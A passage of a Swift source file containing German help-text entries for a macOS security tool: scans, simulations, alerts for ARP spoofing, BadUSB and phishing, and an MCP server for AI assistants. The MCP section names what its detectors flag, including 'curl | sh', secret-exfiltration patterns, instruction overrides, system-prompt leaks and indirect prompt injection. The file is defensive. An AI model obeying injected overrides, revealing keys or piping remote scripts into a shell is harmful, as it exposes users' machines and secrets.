                • Geplanter Scan (Pro): Scannt einmal täglich `~/Downloads`, `~/Desktop` und `~/Library/LaunchAgents` mit ClamAV. Bedrohungen werden automatisch isoliert und mit einem dringenden Alarm gemeldet; ein sauberes Ergebnis führt nur zu einem ruhigen Abschlusshinweis. Wird nur die EICAR-Testsignatur gefunden, wird nichts angezeigt, sondern nur im Benachrichtigungsverlauf vermerkt.
                """,
                recommendation: "Installieren Sie unter Pro ClamAV, damit Definitionsaktualisierungen und geplante Scans automatisch ablaufen."
            ),
            LocalizedEntry(
                id: "feat_simulation_self_test",
                title: "Simulations-Werkzeuge (Selbsttest)",
                summary: "Testen Sie sicher, ob Ransomware-Abwehr, der Malware-Erkennungs-Air-Gap und die Docker-Risikoerkennung funktionieren, ohne einen echten Angriff oder Dateischaden.",
                details: """
                • Ort: Unten in „Malware-Schutz (XProtect & ClamAV)“.
                • 🚨 Ransomware-Abwehr-Simulation (Testmodus)…: Führt dieselben Schritte wie bei einem erkannten Verschlüsselungsversuch aus, um Air-Gap und Notfallfenster zu prüfen. Es werden keine Dateien beschädigt.
                • 🚨 Air-Gap-Simulation bei Malware-Erkennung (Test)…: Führt dieselben Schritte wie bei einer echten XProtect-Erkennung aus, um Eindämmung und Notfallfenster zu prüfen. Das Ereignis wird als Simulation gekennzeichnet.
                • ⚠️ Docker-Risikoerkennungs-Simulation (Testmodus)…: Prüft, ob die Benachrichtigung zu privilegierten Containern eintrifft. Docker wird dabei nicht berührt.
                • Hinweis: Die Air-Gap-Tests trennen das Netzwerk wirklich vorübergehend. Heben Sie die Sperre über das Notfallfenster auf (die Simulationen gelten als hohe Sicherheit und heben sich daher nicht nach 10 Minuten von selbst auf; nach bis zu 1 Stunde wechseln sie in den eingeschränkten Modus).
                • Um den Download-Schutz zu testen, können Sie eine harmlose EICAR-Testdatei verwenden (kein Banner; wird im Benachrichtigungsverlauf vermerkt).
                """,
                recommendation: "Führen Sie nach Aktivierung von Pro oder nach Einstellungsänderungen einmal eine Simulation aus, um zu bestätigen, dass Benachrichtigungen und Air-Gap wie erwartet funktionieren."
            ),
            LocalizedEntry(
                id: "feat_privileged_helper",
                title: "Privilegiertes Helferwerkzeug (RoamSwitchHelper, XPC)",
                summary: "Nur Vorgänge, die Root-Rechte benötigen (PF-Firewall, Freigabedienste, DNS, Air-Gap usw.), werden von einem rechtegetrennten LaunchDaemon-Helfer über XPC ausgeführt.",
                details: """
                • Rechtetrennung: Die Haupt-App läuft mit normalen Benutzerrechten und delegiert nur pf-Regeländerungen, die Steuerung von Freigabediensten, DNS-Einstellungen, ARP-Fixierung, Hashberechnung wichtiger Dateien u. Ä. an `RoamSwitchHelper`.
                • Registrierung: Wird über den SMAppService von macOS als in der App gebündelter LaunchDaemon registriert. Die erste Nutzung erfordert eine Genehmigung unter Systemeinstellungen → Allgemein → Anmeldeobjekte & Erweiterungen. Ist die App nicht im Programme-Ordner, kann sie nicht registriert werden (faq_install_location).
                • Begleitdienste: Auch Helfer-LaunchDaemons für das Air-Gap-Sicherheitsnetz (bei geringer Sicherheit automatische Freigabe nach 10 Minuten, bei hoher Sicherheit eingeschränkter Modus nach der Obergrenze) und das Boot-Gate (bis zu 90 Sekunden) werden registriert.
                • Verifizierung: Bei XPC-Verbindungen werden Codesignaturen (Team-ID) geprüft, um Aufrufe von nicht autorisierten Prozessen abzulehnen.
                • Erneute Genehmigung nach einem Update: Die App versucht automatisch, auf den neuen Helfer umzuschalten, aber macOS kann ihn dennoch auf „ausstehende Genehmigung“ belassen. In diesem Fall wechselt das Menüleistensymbol zu einer Warnung mit „⚠️ Nach dem Update ist eine erneute Genehmigung erforderlich“, und Sie erhalten zusätzlich eine Benachrichtigung.
                """,
                recommendation: "Genehmigen Sie den Helfer beim ersten Start, wenn Sie dazu aufgefordert werden. Ist er nicht genehmigt, zeigt das Menü „⚠️ Helfer genehmigen…“. Erscheint dieser Hinweis oder diese Benachrichtigung nach einem Update, genehmigen Sie ihn auf demselben Weg (Systemeinstellungen > Allgemein > Anmeldeobjekte & Erweiterungen) erneut."
            ),
            LocalizedEntry(
                id: "feat_mcp_server",
                title: "MCP-Server-Integration (Zugriff für KI-Assistenten)",
                summary: "RoamSwitch.app enthält einen MCP-Server (Model Context Protocol), sodass KI-Assistenten wie Claude nach dem Sicherheitszustand Ihres Mac fragen können. Kein Werkzeug ändert Einstellungen, Schutzstufen, Ports oder Geräte. Nur drei Werkzeuge schreiben etwas, und zwar nur in ihre eigenen Protokolldateien.",
                details: """
                • Übertragung: Nur lokales stdio. Programm: `/Applications/RoamSwitch.app/Contents/MacOS/RoamSwitchMCPServer`.
                • Wichtigste Tools (insgesamt 35): `get_security_report` (Sicherheitsprüfung), `verify_security_findings` (prüft erneut, ob Befunde der Prüfung noch bestehen; nur lesend; `change` unterscheidet eine Behebung von einer Prüfung, die nie zutraf), `get_exposed_ports`, `get_guard_status`, `audit_url_safety`, `audit_secrets`, `audit_mcp_configs` (prüft MCP-Client-Konfigurationsdateien auf riskante Einträge, auch auf einen Server, der von anderen geschriebenen Text liest, neben einem Server, der Befehle ausführen kann (die Konstellation, die indirekte Prompt-Injection braucht); lokal, nur lesend; läuft auch im eigenen Fenster unter Malware-Schutz → „🧩 MCP-Konfiguration (KI-Anbindung) prüfen…“), `audit_agent_setup` (prüft die Anweisungsdateien, Skills und OpenClaw-Einstellungen für KI-Agenten auf riskante Inhalte wie unsichtbare Unicode-Zeichen, überschriebene Anweisungen, curl | sh und die Form eines Geheimnis-Abflusses; prüft mit denselben Regeln auch den Speicher von Agenten sowie in den registrierten Projekten die `.vscode/tasks.json` (Aufgaben, die beim Öffnen des Ordners laufen) und `.github/workflows` (Pull-Request-Code mit Geheimnissen, nicht vertrauenswürdiger Text in Skripten, nicht an einen Commit gebundene Drittanbieter-Actions); bei den Claude-Code-Einstellungen (`settings.json` und `settings.local.json` in `~/.claude` und im Ordner `.claude` jedes registrierten Projekts) prüft es zudem auf einen Berechtigungsmodus, der alles ohne Rückfrage ausführt, eine Erlaubnisregel für beliebige Befehle, Hooks und einen geänderten API-Endpunkt und meldet Einstellungen, die seit der Markierung als geprüft lockerer geworden sind (eine entfernte Verbotsregel, eine weite Erlaubnisregel oder ein Hook hinzugefügt, der Berechtigungsmodus angehoben, die Sandbox ausgeschaltet); der Text von Regeln und Befehlen wird nie ausgegeben; lokal, nur lesend; läuft auch im eigenen Fenster unter Malware-Schutz → „🤖 Anweisungsdateien von KI-Agenten prüfen…“), `audit_security_logs`, `get_quarantine_status`, `get_notification_history`, `get_canary_status`, `get_port_anomaly_incidents`, `get_ssh_guard_incidents` (SSH-Brute-Force-Einträge und letzte SSH-Anmeldungen; nur lesend), `get_runtime_threat_status`, `get_incident_timeline` (Eindämmungs-Vorfall-Zeitleiste),`get_detection_coverage` (listet Angriffstechniken auf, die RoamSwitch erkennen bzw. nicht erkennen kann; nur lesend), `get_network_history` (Netzwerkverlauf-Lernen), `run_package_cve_scan`, `run_package_cve_scan_languages`, `run_active_vuln_scan` (ausschließlich nicht-destruktive Sondierungen an 127.0.0.1), `run_npm_audit_signatures` (das einzige Tool, das einen externen Server kontaktiert, nämlich die npm-Registry; Pro, Opt-in) sowie `get_app_help` (diese Wissensdatenbank).
                • Prozessstart-Protokoll (Pro, nur lesend): `search_exec_events` (Startereignisse durchsuchen) und `get_process_tree` (Vorfahren und Nachfahren eines Prozesses).
                • Ressourcen: `roamswitch://docs/features`, `roamswitch://docs/alerts-and-messages`, `roamswitch://docs/settings-guide`, `roamswitch://docs/troubleshooting`.
                • Sprache: Antworten folgen der Spracheinstellung der App. `get_app_help` akzeptiert ein `language`-Argument (ja / en / zh-Hans / zh-Hant / ko / de / fr / es / it / pt-PT).
                • Werkzeuge, die lokalen Zustand schreiben: `run_active_vuln_scan` (hängt seine Ergebnisse an den lokalen Scan-Verlauf an), `audit_security_logs` (aktualisiert die Basis der Protokollmuster und den Benachrichtigungsverlauf) und `run_npm_audit_signatures` (npm schreibt seinen eigenen Cache und seine Logs) schreiben lokalen Zustand, daher ist ihr MCP-Schreibschutz-Hinweis „falsch“. Keines ändert eine Einstellung oder die Schutzstufe.
                • audit_mcp_configs: Außerdem wird gemeldet, wenn in der env eines MCP-Servers Variablen stehen, die den Datenverkehr über einen Proxy leiten (HTTP_PROXY, HTTPS_PROXY, ALL_PROXY), eine zusätzliche Zertifizierungsstelle als vertrauenswürdig einstufen (NODE_EXTRA_CA_CERTS, SSL_CERT_FILE, SSL_CERT_DIR, REQUESTS_CA_BUNDLE, CURL_CA_BUNDLE, GIT_SSL_CAINFO) oder die Zertifikatsprüfung abschalten (NODE_TLS_REJECT_UNAUTHORIZED=0) (traffic_interception_env, Schweregrad medium). Die Werte werden nie angezeigt, bei einem Proxy nur der Host. Es kann sich um eine korrekte Firmen-Proxy-Einstellung handeln; das steht auch im Meldungstext.
                • Sicherheit: Da kein Werkzeug eine Einstellung oder die Schutzstufe ändert, kann selbst eine durch Prompt-Injection manipulierte KI weder die Schutzstufe ändern noch Ports isolieren.
                • Die Erkennung von Formulierungen in Befehlsform deckt jetzt auch Aufforderungen ab, die Tools aufzulisten oder API-Keys, Tokens oder Umgebungsvariablen preiszugeben (system-prompt-leak), Aufforderungen, zu bestätigen oder zu antworten, dass man Befugnis hat (authority-claim), und Anweisungen, etwas als sicher, als ohne Bedrohung oder als gelöst zu melden (instruction-override). Die Zahl der Kategorien ist unverändert.
                • Änderungserkennung für KI-Agent-Einstellungen: eine Hintergrundmitteilung, die mit dem Stand vergleicht, den Sie mit „Diesen Stand als geprüft markieren“ bestätigt haben. Nur mit Pro, und ohne bestätigten Stand läuft sie nicht. Der Zustand steht im Prüffenster und als agentSetupWatch in `get_guard_status` (Grund no_baseline oder pro_not_active).
                """,
                recommendation: "Zur Einrichtung siehe faq_mcp_setup. Sie können in normaler Sprache fragen, etwa „Ist mein Mac gerade sicher?“ oder „Was bedeutet diese Benachrichtigung?“"
            ),
            LocalizedEntry(
                id: "feat_license_pro_tier",
                title: "Pro-Dauerlizenz (Einmalkauf, bis zu 2 Macs)",
                summary: "Pro ist eine einmalig erworbene Dauerlizenz (¥2.980 / 19,99 $) für bis zu 2 Macs. Das mit Ed25519 signierte Lizenz-Token wird auf dem Gerät verifiziert, sodass Pro nach der Aktivierung auch offline weiterläuft.",
                details: """
                • Pro-Funktionen: Die im Menü mit (Pro) markierten automatischen Schutzmaßnahmen (Ransomware-Köderdatei-Erkennung, XProtect-gebundene Trennung, automatische Blockierung unbekannter Ports und Isolation von Entwicklungsservern, ARP-Spoofing-Auto-Blockierung, Gateway-ARP/NDP-Fixierung, VPN-Tunnel, BadUSB- und USB-Speicherschutz, Web- & E-Mail-Schutz, DNS-Bedrohungsschutz, Link-Schutz, automatisches Bluetooth-Aus, ClickFix-Schutz, Überwachung von Autostart-Registrierungen, Docker-Risikoerkennung, Überwachung wichtiger Dateien auf Manipulation, automatische Protokollprüfung), Echtzeit-Bedrohungsbenachrichtigungen, Patrouillenwarnungen und geplante Scans, CSV-Export von Protokollen und mehr.
                • Lizenztypen: Pro-Dauerlizenz (2 Macs) und Team-Dauerlizenz (5 Macs).
                • Aktivierung: Geben Sie Ihren Lizenzschlüssel (ROAM-XXXX-…) unter „💎 Pro aktivieren / kaufen…“ ein. Das vom Server ausgestellte signierte Token wird mit dem in der App eingebetteten öffentlichen Schlüssel verifiziert und im Schlüsselbund gespeichert.
                • Deaktivierung: Über das Lizenzfenster. Entfernt die Lizenz von diesem Mac und gibt den Platz auf dem Server frei (die lokale Deaktivierung erfolgt immer, auch wenn die Netzwerkanfrage fehlschlägt).
                • Bei Ablauf: Nur-Pro-Schutzfunktionen werden automatisch deaktiviert, und VPN-Tunnel sowie Port-Isolation werden aufgehoben.
                """,
                recommendation: "Ziehen Sie Pro in Betracht, wenn Sie automatische Eindämmung, Echtzeitschutz und Patrouillenwarnungen wünschen. Deaktivieren Sie beim Wechsel des Mac zuerst auf dem alten Gerät, bevor Sie auf dem neuen aktivieren."
            ),
        ]
    }

    // MARK: - Alerts: network, devices, links

    private static func alertsDeNetwork() -> [LocalizedEntry] {
        return [
            LocalizedEntry(
                id: "alert_arp_spoofing",
                title: "⚠️ ARP-Spoofing-(MITM-)Alarm",
                summary: "Wird angezeigt, wenn Anzeichen dafür bestehen, dass ein Gerät in Ihrem Netzwerk den Router (Gateway) vortäuscht, um Ihren Datenverkehr abzuhören oder zu manipulieren.",
                details: """
                • Ursache: Ein Angreifer sendet gefälschte ARP-Antworten, damit Ihr Datenverkehr über ihn läuft (Man-in-the-Middle). Erkannt wird dies, wenn die IP-Adresse des Gateways gleich bleibt, seine MAC-Adresse sich aber plötzlich ändert. Auch ein Router-Neustart oder ein Mesh-WLAN-Wechsel kann dies auslösen.
                • Automatische Abwehr: Bei Maximaler Sperre mit aktiviertem „Automatische Blockierung bei ARP-Spoofing (Identitätsvortäuschung im Netzwerk) (Pro)“ erfolgt sofortige Air-Gap-Eindämmung. Auf anderen Stufen erfolgt nur eine Benachrichtigung, und das Menü zeigt „ARP-Spoofing erkannt – jetzt gesamtes Netzwerk trennen“.
                """,
                recommendation: """
                1. Geben Sie in diesem Netzwerk sofort keine Passwörter mehr ein, tätigen Sie keine Zahlungen und übertragen Sie keinen Arbeitsverkehr mehr.
                2. Wählen Sie bei öffentlichem WLAN oder einem unbekannten Netzwerk im Menü „jetzt gesamtes Netzwerk trennen“ oder schalten Sie WLAN aus.
                3. Benötigen Sie Internetzugang, wechseln Sie zu einer sicheren Verbindung wie Tethering oder dem VPN-Tunnel.
                4. Nutzen Sie das Netzwerk nur weiter, wenn Sie sicher wissen, dass es ein Fehlalarm ist, etwa direkt nach einem Neustart Ihres Heimrouters.
                """
            ),
            LocalizedEntry(
                id: "alert_evil_twin_ssid",
                title: "⚠️ Mögliches Evil-Twin-WLAN-Netzwerk erkannt",
                summary: "Wird angezeigt, wenn der Name (SSID) des WLANs, dem Sie beigetreten sind, einem zuvor genutzten Netzwerk sehr ähnlich ist. Es könnte sich um einen bösartigen gefälschten Access Point (Evil Twin) handeln.",
                details: """
                • Ursache: Ein Angreifer richtet einen gefälschten Access Point ein, dessen Name sich nur um ein oder zwei Zeichen vom legitimen unterscheidet, um Menschen anzulocken. Das Netzwerkverlauf-Lernen (feat_network_history_guard) beurteilt dies anhand der Editierdistanz zu gelernten Namen und der abweichenden Gateway-Hardware.
                • Vermeidung von Fehlalarmen: Kurze Namen und zusätzliche SSIDs derselben Gateway-Hardware lösen dies nicht aus.
                • Automatische Abwehr: Nur eine Benachrichtigung. Als nicht registriertes Netzwerk gilt die Stufe „Standard-Schutz unterwegs“.
                """,
                recommendation: """
                1. Melden Sie sich in diesem WLAN nicht an und geben Sie keine persönlichen Daten ein.
                2. Bestätigen Sie den offiziellen Netzwerknamen (Aushänge im Geschäft oder Büro) und trennen Sie die Verbindung, falls er nicht übereinstimmt.
                3. Müssen Sie es dennoch nutzen, verbinden Sie den VPN-Tunnel.
                """
            ),
            LocalizedEntry(
                id: "alert_unencrypted_wifi",
                title: "⚠️ Mit unverschlüsseltem WLAN verbunden",
                summary: "Wird angezeigt, wenn Sie einem offenen WLAN ohne Passwort oder Verschlüsselung (WPA2 / WPA3) oder einem alten WEP-Netzwerk beitreten.",
                details: """
                • Ursache: Die Funkverbindung ist nicht verschlüsselt, sodass jeder in der Nähe den Datenverkehr abfangen kann.
                • Automatische Abwehr: Ist das Netzwerk nicht registriert, blockiert „Standard-Schutz unterwegs“ (anfänglich Maximale Sperre) eingehende Verbindungen und Freigabedienste.
                """,
                recommendation: """
                1. Verbinden Sie nach Möglichkeit den VPN-Tunnel oder wechseln Sie zu einer vertrauenswürdigen Verbindung wie Tethering.
                2. Melden Sie sich nicht an oder geben Sie keine persönlichen Daten auf Seiten ein, die nicht HTTPS verwenden.
                3. Bestätigen Sie im Menü, dass die Schutzstufe Maximale Sperre ist.
                """
            ),
            LocalizedEntry(
                id: "alert_port_anomaly",
                title: "🚨 Unbekannten Listening-Port automatisch blockiert",
                summary: "Wird angezeigt, wenn ein zuvor nicht exponiertes Programm begonnen hat, einen Port auf 0.0.0.0 dem LAN zu exponieren, und der Zugriff von außen automatisch blockiert wurde (schlägt die Blockierung fehl, erscheint „Unbekannten Listening-Port erkannt (Blockierung fehlgeschlagen)“).",
                details: """
                • Ursache: Ein startender Entwicklungsserver (Next.js, Vite, Python, Docker), eine LAN-Empfangs-App wie LocalSend oder Syncthing beim ersten Start, oder eine Backdoor bzw. bösartige App, die zu lauschen beginnt.
                • Automatische Abwehr: pf blockiert nur den externen Zugriff (der Mac selbst und localhost können ihn weiterhin nutzen). macOS-Systemdienste sind ausgenommen.
                """,
                recommendation: """
                1. Prüfen Sie, ob Ihnen der in der Benachrichtigung gezeigte Prozessname, die PID und der Port bekannt vorkommen (auch unter „Freigegebene Ports“ sichtbar).
                2. Handelt es sich um Ihren eigenen Server oder eine LAN-Empfangs-App, erlauben Sie ihn über die Schaltfläche „Erlauben“ in der Benachrichtigung oder im Port-Prüfbildschirm. Er bleibt danach dauerhaft erlaubt.
                3. Bei Entwicklungsservern ist ein Neustart mit Bindung an `127.0.0.1` die sicherste Option.
                4. Kommt er Ihnen nicht bekannt vor, lassen Sie ihn blockiert, beenden Sie den Prozess und führen Sie die Sicherheitsprüfung sowie einen Virenscan durch.
                """
            ),
            LocalizedEntry(
                id: "alert_exposed_database",
                title: "🚨 Nicht authentifizierter Datenbankdienst nach außen freigegeben",
                summary: "Wird angezeigt, wenn ein Dienst, der standardmäßig oft keine Authentifizierung hat (Redis, MongoDB, Memcached, Elasticsearch), ohne Firewall-Schutz dem LAN ausgesetzt ist.",
                details: """
                • Ursache: Ein Datenbank- oder Backend-Dienst wurde auf 0.0.0.0 gestartet, während die aktuelle Schutzstufe eingehende Verbindungen erlaubt. Jeder im selben Netzwerk könnte möglicherweise Daten lesen oder schreiben.
                • Automatische Abwehr: Nur eine Benachrichtigung (Pro), die für denselben Port nicht wiederholt wird.
                """,
                recommendation: """
                1. Ändern Sie die Lauschadresse des Dienstes auf `127.0.0.1` oder aktivieren Sie die Authentifizierung.
                2. Können Sie es nicht sofort beheben, öffnen Sie den Port unter „Freigegebene Ports“ und wählen Sie „Port isolieren“.
                3. Nutzen Sie in öffentlichen Netzwerken die Maximale Sperre.
                """
            ),
            LocalizedEntry(
                id: "alert_unapproved_keyboard",
                title: "⚠️ Unbefugte Tastatur / BadUSB-Verbindung erkannt",
                summary: "Die Benachrichtigung und das Genehmigungsfenster, die erscheinen, wenn eine neue USB-Tastatur, die nicht auf der Positivliste steht (oder ein Gerät, das sich als solche ausgibt, etwa ein manipuliertes Kabel), angeschlossen wird und ihre Tastenanschläge bis zur Genehmigung blockiert werden.",
                details: """
                • Ursache: Anschluss einer neuen externen Tastatur oder Docking-Station, oder eines Tastatureingabe-Einschleusungsgeräts wie eines Rubber Ducky.
                • Automatische Abwehr: Nur die Tastenanschläge dieses Geräts werden blockiert (andere Tastaturen funktionieren weiter). Das Fenster „⚠️ Unbekanntes USB-Gerät / Tastatur erkannt“ fordert eine Genehmigung an.
                """,
                recommendation: """
                1. Handelt es sich um eine vertrauenswürdige, selbst angeschlossene Tastatur, klicken Sie „Vertrauen & Erlauben“. Sie wird auf die Positivliste gesetzt und die Eingabe aktiviert.
                2. Kommt Ihnen das Gerät nicht bekannt vor oder erscheint die Meldung, obwohl Sie nichts angeschlossen haben, klicken Sie „Ablehnen & blockiert lassen“ und trennen Sie das Gerät.
                """
            ),
            LocalizedEntry(
                id: "alert_scripted_keyboard",
                title: "🚨 Diese Tastatur zeigt Anzeichen für automatisierte (skriptgesteuerte) Eingabe",
                summary: "Wird angezeigt, wenn eine auf Genehmigung wartende Tastatur Tastenanschläge in Abständen sendet, die für einen Menschen zu schnell und zu gleichmäßig sind. Automatisierte Befehlseinschleusung (ein BadUSB-Angriff) ist sehr wahrscheinlich.",
                details: """
                • Ursache: Ein Rubber Ducky, Flipper Zero, Arduino/Digispark o. Ä. versuchte, vorbereitete Befehle mit hoher Geschwindigkeit einzutippen. Beurteilt durch die Tastaturanschlags-Timing-Analyse: nach mindestens 5 Intervallen ein Mittelwert von 12 ms oder weniger, oder 45 ms oder weniger bei sehr hoher Gleichmäßigkeit.
                • Automatische Abwehr: Die Tastenanschläge des Geräts waren bereits vor der Genehmigung blockiert und haben den Mac nie erreicht. Diese Warnung liefert lediglich zusätzliche Belege für Ihre Entscheidung.
                """,
                recommendation: """
                1. Wählen Sie im Genehmigungsfenster immer „Ablehnen & blockiert lassen“.
                2. Trennen Sie das Gerät sofort und prüfen Sie, woher es stammt (ein gefundener USB-Stick, ein geschenktes Kabel usw.).
                3. Führen Sie sicherheitshalber die Sicherheitsprüfung aus und überprüfen Sie Autostart-Registrierungen.
                """
            ),
            LocalizedEntry(
                id: "alert_untrusted_usb",
                title: "🔒 USB-Speicher schreibgeschützt eingebunden / 🔌 Unbefugten USB-Speicher automatisch blockiert",
                summary: "Wird angezeigt, wenn ein USB-Laufwerk oder externes Speichermedium, das nicht auf der Positivliste steht, angeschlossen und schreibgeschützt eingebunden wurde, während Ihre Genehmigung aussteht, oder bereits ausgeworfen wurde.",
                details: """
                • Ursache: Es wurde ein nicht registriertes Speichergerät angeschlossen. Dies verhindert Datendiebstahl und das Einschleusen bösartiger Dateien.
                • Automatische Abwehr: Schreibgeschützt neu eingebunden, mit dem Dialog „USB-Speicher „…“ zulassen?“. Bei „Auswerfen“ wird das Gerät ausgeworfen und „Unbefugten USB-Speicher automatisch blockiert“ gemeldet.
                """,
                recommendation: """
                1. Handelt es sich um Ihr Gerät, wählen Sie „Lesen/Schreiben zulassen“ oder „Schreibgeschützt zulassen“. Es wird auf die Positivliste gesetzt und beim nächsten Mal automatisch angewendet.
                2. Kommt es Ihnen nicht bekannt vor, wählen Sie „Auswerfen“.
                3. Die Positivliste können Sie später unter „USB / BadUSB-Schutzeinstellungen…“ ändern.
                """
            ),
            LocalizedEntry(
                id: "alert_malware_usb",
                title: "🚨 Malware auf USB-Speicher erkannt",
                summary: "Wird angezeigt, wenn der vor dem Lesen/Schreiben-Anschluss eines USB-Speichergeräts durchgeführte ClamAV-Scan infizierte Dateien findet.",
                details: """
                • Ursache: Infizierte Dateien auf dem USB-Laufwerk.
                • Automatische Abwehr: Das Volume wird sofort ausgeworfen, damit der Mac nicht infiziert wird.
                """,
                recommendation: """
                1. Formatieren oder desinfizieren Sie das Laufwerk in einer separaten sicheren Umgebung, bevor Sie es erneut nutzen.
                2. Führen Sie einen ClamAV-Schnellscan oder Ordnerscan durch, um sicherzustellen, dass der Mac selbst nicht infiziert ist.
                """
            ),
            LocalizedEntry(
                id: "alert_link_guard_blocked",
                title: "🛑 Link-Schutz: Verbindung blockiert",
                summary: "Wird angezeigt, wenn der Link-Schutz automatisch eine Verbindung zu einer vermuteten Betrugs- oder Phishing-Seite blockiert hat (in der Bedrohungsliste geführt oder Markenhomograph).",
                details: """
                • Ursache: Ein Link aus E-Mail oder sozialen Medien, eine Anzeige oder eine App versuchte, eine Verbindung zu einer bekannten Betrugsdomain herzustellen.
                • Automatische Abwehr: Die Systemerweiterung verwirft die Verbindung, oder die hosts-Notlösung löst die Domain auf 0.0.0.0 auf, unabhängig von Browser oder App.
                """,
                recommendation: """
                1. War dies nicht erwartet, ist nichts weiter nötig; geben Sie auf dieser Seite keine Informationen ein.
                2. Wurde eine benötigte legitime Seite versehentlich blockiert, nutzen Sie „Einmal erlauben (5 Min.)“ in der Benachrichtigung.
                """
            ),
            LocalizedEntry(
                id: "alert_link_guard_warn_hold",
                title: "⚠️ Link-Schutz: Verbindung angehalten",
                summary: "Im Warnmodus die Benachrichtigung und das Fenster im Vordergrund, die erscheinen, wenn eine Verbindung zu einer vermuteten Markenimitations- oder Betrugsseite angehalten wurde, während Sie über die Freigabe entscheiden.",
                details: """
                • Ursache: Eine Verbindung zu einer Domain, die eine Warnung auslöst (Subdomain-Imitation, riskante TLD u. Ä.).
                • Automatische Abwehr: Die Verbindung wird angehalten und wartet auf Ihre Antwort. Ohne Antwort innerhalb von etwa 8 Sekunden wird sie blockiert (schließt bei Ausfall). Dieses Ergebnis wird nicht zwischengespeichert, sodass beim nächsten Besuch erneut gefragt wird. Ihre tatsächlichen Antworten werden gespeichert.
                """,
                recommendation: """
                1. Haben Sie die Seite absichtlich geöffnet und vertrauen ihr, wählen Sie „Erlauben“.
                2. Kommt sie Ihnen nicht bekannt vor oder sind Sie unsicher, wählen Sie „Blockieren“ oder warten Sie einfach ab (sie wird automatisch blockiert).
                3. Wurde sie versehentlich blockiert, führt ein Neuladen der Seite zu einer erneuten Nachfrage.
                """
            ),
            LocalizedEntry(
                id: "alert_dangerous_url",
                title: "🛑 Gefährlicher Link / Phishing-Verdacht (Link-Sicherheitsprüfung)",
                summary: "Wird angezeigt, wenn die Link-Sicherheitsprüfung (oder `audit_url_safety`) eine URL wegen Homographen, einer gefälschten Subdomain, einer riskanten TLD u. Ä. als gefährlich einstuft.",
                details: """
                • Prüfungen: Homograph-Zeichen (Punycode), Subdomains, die große Unternehmen nachahmen, bei Phishing häufige TLDs, unverschlüsseltes HTTP, rohe IP-Adressen und mehr.
                • Punktzahl: Unter 50 gilt als gefährlich; 50–79 als bedenklich.
                """,
                recommendation: """
                1. Öffnen Sie den Link nicht.
                2. Löschen Sie die Nachricht und melden Sie sie gegebenenfalls Ihrem Sicherheitsteam.
                """
            ),
            LocalizedEntry(
                id: "alert_helper_disconnected",
                title: "⚠️ Helfer nicht verbunden",
                summary: "Wird angezeigt, wenn die XPC-Kommunikation mit dem privilegierten Helferwerkzeug (RoamSwitchHelper) nicht aufgebaut werden kann.",
                details: """
                • Ursache: Die Hintergrundausführung ist unter Anmeldeobjekte & Erweiterungen nicht genehmigt, der Helfer wurde nach einem macOS-Update gestoppt, oder die App befindet sich außerhalb des Programme-Ordners (in Downloads oder im Disk-Image).
                • Auswirkung: Vorgänge, die Root-Rechte benötigen (Wechsel der Schutzstufe, Air-Gap-Eindämmung, DNS-Einstellungen, Überwachung wichtiger Dateien usw.), können nicht ausgeführt werden.
                """,
                recommendation: """
                1. Wählen Sie im Menü „⚠️ Helfer genehmigen…“, um die Genehmigungsschritte zu öffnen.
                2. Aktivieren Sie unter Systemeinstellungen → Allgemein → Anmeldeobjekte & Erweiterungen im Bereich „Ausführung im Hintergrund erlauben“ RoamSwitchHelper.
                3. Vergewissern Sie sich, dass RoamSwitch im Programme-Ordner liegt.
                4. Hilft das nicht, folgen Sie faq_helper_troubleshooting.
                """
            ),
            LocalizedEntry(
                id: "alert_score_drop",
                title: "⚠️ Warnung: Mac-Sicherheit verschlechtert",
                summary: "Wird von der autonomen Patrouille gesendet, wenn der Sicherheitswert unter 80 fällt oder 4 oder mehr Punkte nicht bestehen (Pro).",
                details: """
                • Ursache: Eine Änderung an Einstellungen oder Umgebung, etwa das Deaktivieren von FileVault oder der Firewall, ein exponierter gefährlicher Port oder ein gestoppter Schutz.
                • Kriterien: Punktzahl unter 80, oder 4 oder mehr nicht bestandene Punkte.
                """,
                recommendation: """
                1. Öffnen Sie den Prüfbericht über das Menü (oder nutzen Sie das MCP-Tool `get_security_report`).
                2. Arbeiten Sie die mit ⚠️ markierten Punkte anhand der angezeigten Korrekturschritte ab.
                """
            ),
            LocalizedEntry(
                id: "alert_exposed_software",
                title: "⚠️ Ungepatchte, leicht ausnutzbare Schwachstellen",
                summary: "Wird gesendet, wenn der Prüfpunkt „Leicht ausnutzbare Schwachstellen (installierte Software)“ neu fehlschlägt, und nach einem Tag erneut, solange er fehlschlägt (Pro; Free-Nutzer finden sie im Benachrichtigungsverlauf).",
                details: """
                • Ursache: Ein mit Homebrew installiertes Paket oder PHP enthält in einer betroffenen Version noch eine Schwachstelle, die laut CISA ausgenutzt wird (KEV) oder deren EPSS bei 90 % oder höher liegt.
                • Intervall: stündliche Prüfung. Gesendet, wenn eine neue Schwachstelle hinzukommt, und einmal täglich, solange dieselben bestehen.
                """,
                recommendation: """
                1. Prüfen Sie die Namen aus der Meldung im Prüfbericht (Menü oder MCP-Tool `get_security_report`) unter „Leicht ausnutzbare Schwachstellen (installierte Software)“.
                2. Aktualisieren Sie Homebrew-Pakete mit `brew upgrade` im Terminal. PHP, das nicht von Homebrew stammt, installieren Sie neu.
                """
            ),
        ]
    }

    // MARK: - Alerts: malware, containment, audit

    private static func alertsDeMalware() -> [LocalizedEntry] {
        return [
            LocalizedEntry(
                id: "alert_quarantined_download",
                title: "🚨 Gefährliche heruntergeladene Datei isoliert",
                summary: "Wird angezeigt, wenn eine aus Browser, Mail oder einer Chat-App gespeicherte Datei eine Bedrohung enthielt und in die Quarantäne verschoben wurde (schlägt die Verschiebung fehl, erscheint „Quarantäne fehlgeschlagen“).",
                details: """
                • Ursache: Die heruntergeladene Datei enthielt Malware, einen Trojaner, eine Reverse Shell o. Ä.
                • Automatische Abwehr: Verschoben nach `~/Library/Application Support/RoamSwitch/Quarantine/`, sodass sie nicht ausgeführt werden kann. Hat die statische Signaturprüfung angeschlagen, ClamAV aber nicht, erwähnt die Benachrichtigung einen möglichen Fehlalarm.
                """,
                recommendation: """
                1. War die Quarantäne erfolgreich, kann die Datei nicht ausgeführt werden.
                2. Öffnen Sie „📦 Quarantänedateien verwalten…“ und wählen Sie „Endgültig löschen“, wenn Sie sie nicht kennen.
                3. Nutzen Sie „Wiederherstellen“ oder „Ausschließen & wiederherstellen“ nur bei sicheren Fehlalarmen.
                4. Ist die Quarantäne fehlgeschlagen, löschen Sie die in der Benachrichtigung genannte Datei manuell.
                """
            ),
            LocalizedEntry(
                id: "alert_eicar_test_signature",
